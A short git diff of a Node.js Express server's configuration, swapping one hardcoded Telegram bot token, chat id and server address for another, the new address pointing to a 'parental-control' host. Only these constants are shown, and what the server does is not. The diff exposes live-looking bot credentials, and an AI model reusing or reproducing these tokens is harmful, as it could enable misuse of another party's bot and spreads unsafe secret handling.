@@ -7,9 +7,9 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '5376895931:AAGungqejutol8QIidI2tlJMkmCSUuAAY9w'
-const id = '5155109916'
-const address = 'https://www.google.com'
+const token = '7829238837:AAF3JMvIZDLc9YkxCMfK8tVuZ-3CDaD6xdM'
+const id = '6956029558'
+const address = 'https://parental-control.onrender.com'
 
 const app = express();
 const appServer = http.createServer(app);
